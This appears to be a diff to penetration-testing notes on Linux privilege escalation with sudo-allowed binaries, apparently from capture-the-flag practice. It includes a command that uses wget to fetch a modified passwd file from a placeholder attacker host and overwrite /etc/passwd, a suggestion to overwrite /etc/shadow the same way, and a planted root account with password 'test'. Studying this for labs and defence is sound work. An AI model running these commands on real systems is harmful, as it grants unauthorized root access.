@@ -80,7 +80,7 @@ Newuser:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoO
 Su newuser
 ```
   - Password is "test".
-## Wget
+## Wget (ippsec:Sunday)
 You can download a copy of the target passwd file, change it, then re-upload it to the target machine.
 1. Send the passwd file from the target box to your attacker box through various transfer means.
 2. Add a new root user with a password of "test".
@@ -91,6 +91,7 @@ Newuser:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoO
 ```
 sudo wget [attacker IP]:[port]/passwd -O /etc/passwd
 ```
+  - Or substitute in /etc/shadow instead of /etc/passwd if the shadow file is used (which is likely).
 ## Apache
 Can't get a shell with this binary but can display file contents.
 ```
